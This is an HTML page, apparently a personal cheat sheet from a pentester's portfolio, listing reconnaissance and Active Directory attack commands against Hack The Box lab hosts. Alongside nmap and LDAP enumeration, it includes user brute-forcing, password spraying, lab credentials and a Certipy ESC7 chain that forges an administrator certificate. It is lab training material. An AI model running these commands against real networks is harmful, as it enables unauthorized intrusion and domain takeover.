@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Recon cheat sheet" />
+  <title>Recon Cheat Sheet</title>
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <nav class="cheatsheet-navbar">
+  <div class="nav-left">
+    <a href="index.html" class="nav-logo">Portfolio</a>
+  </div>
+  <ul class="nav-right">
+    <li><a href="../writeups/">Writeups</a></li>
+    <li><a href="cheatsheet.html" class="active">Cheatsheets</a></li>
+    <li><a href="../index.html">Home</a></li>
+  </ul>
+</nav>
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap">
+      <h1>Recon & Enumeration</h1>
+      <nav class="main-nav">
+        <ul>
+          <li><a href="index.html">Home</a></li>
+          <li><a href="recon.html" class="active">Recon</a></li>
+          <li><a href="windows.html">Windows</a></li>
+          <li><a href="web.html">Web</a></li>
+          <li><a href="privesc.html">PrivEsc</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <article>
+      <h2>AutoRecon</h2>
+      <div class="code">
+        <button class="copy-btn" data-target="cmd1">Copy</button>
+        <pre><code id="cmd1">autorecon -t targets.txt -vvv --ignore-plugin-checks</code></pre>
+      </div>
+
+      <h2>Nmap Automator</h2>
+      <div class="code">
+        <button class="copy-btn" data-target="cmd2">Copy</button>
+        <pre><code id="cmd2">~/Tools/Recon/nmapAutomator.sh -H 192.168.53.68 -t Port</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd3">Copy</button>
+        <pre><code id="cmd3">~/Tools/Recon/nmapAutomator.sh -H 192.168.236.168 -t All</code></pre>
+      </div>
+
+      <h2>Nmap</h2>
+      <div class="code">
+        <button class="copy-btn" data-target="cmd4">Copy</button>
+        <pre><code id="cmd4">nmap -sn 192.168.1.0/24</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd5">Copy</button>
+        <pre><code id="cmd5">sudo nmap -sC -sV -vvv --open &lt;host&gt; -oN nmap-basic</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd6">Copy</button>
+        <pre><code id="cmd6">sudo nmap -p- -sC -sV --open &lt;host&gt; -oN nmap-all-ports</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd7">Copy</button>
+        <pre><code id="cmd7">sudo nmap -sU --top-ports 100 &lt;host&gt; -oN nmap-udp</code></pre>
+      </div>
+
+      <h2>Windows - Kerbrute / NetExec / NXC</h2>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd8">Copy</button>
+        <pre><code id="cmd8">./kerbrute userenum --dc 10.10.11.236 -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd9">Copy</button>
+        <pre><code id="cmd9">netexec smb 10.10.11.236 -k -u 'ryan' -p ''</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd10">Copy</button>
+        <pre><code id="cmd10">nxc smb 10.10.11.35 -u '.' -p '' --rid-brute</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd11">Copy</button>
+        <pre><code id="cmd11">netexec smb 10.10.11.236 -u users.txt -p users.txt --no-bruteforce --continue-on-success</code></pre>
+      </div>
+
+      <h2>LDAP</h2>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd12">Copy</button>
+        <pre><code id="cmd12">ldapsearch -x -H ldap://10.10.10.161 -x -s base</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd13">Copy</button>
+        <pre><code id="cmd13">ldapsearch -x -H ldap://10.10.10.161 -x -b 'DC=htb,DC=local' &gt; ldapinfo.txt</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd14">Copy</button>
+        <pre><code id="cmd14">ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 '(objectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}'</code></pre>
+      </div>
+
+      <h2>DNS / Zone transfer</h2>
+      <div class="code">
+        <button class="copy-btn" data-target="cmd15">Copy</button>
+        <pre><code id="cmd15">dnsenum &lt;IP or domain&gt;</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd16">Copy</button>
+        <pre><code id="cmd16">dig @&lt;DNS_IP&gt; axfr &lt;DOMAIN&gt;</code></pre>
+      </div>
+
+      <h2>RDP quick connect</h2>
+      <div class="code">
+        <button class="copy-btn" data-target="cmd17">Copy</button>
+        <pre><code id="cmd17">xfreerdp3 /u:emma /p:SomersetVinyl1! /v:192.168.128.248 +clipboard</code></pre>
+      </div>
+
+      <h2>Certipy</h2>
+      <p>Search for vulnerable AD CS / templates with Certipy:</p>
+      <div class="code">
+        <button class="copy-btn" data-target="cmd18">Copy</button>
+        <pre><code id="cmd18">certipy-ad find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable</code></pre>
+      </div>
+
+      <h3>ESC7 / ESC16 quick commands (reference)</h3>
+      <div class="code">
+        <button class="copy-btn" data-target="cmd19">Copy</button>
+        <pre><code id="cmd19">certipy-ad ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd20">Copy</button>
+        <pre><code id="cmd20">certipy-ad req -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb</code></pre>
+      </div>
+
+      <div class="code">
+        <button class="copy-btn" data-target="cmd21">Copy</button>
+        <pre><code id="cmd21">certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236</code></pre>
+      </div>
+
+      <h2>Cloud / S3</h2>
+      <div class="code">
+        <button class="copy-btn" data-target="cmd22">Copy</button>
+        <pre><code id="cmd22">cloudbrute -d mentorquotes.htb -k mentor -m storage -t 80 -T 10 -c amazon -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -o cloud-brute-apps.txt</code></pre>
+      </div>
+
+      <h2>Notes</h2>
+      <ul>
+        <li>Keep credentials and hash cracking workflows separate; save hashes to files and crack locally (hashcat/john).</li>
+        <li>When enumerating AD, always export BloodHound data and examine service accounts / ACLs.</li>
+      </ul>
+
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap">
+      <p>© Rachel Murphy 2025</p>
+      <p><a href="index.html">Back</a></p>
+    </div>
+  </footer>
+
+  <script src="/assets/css/js/script.js"></script>
+</body>
+</html>
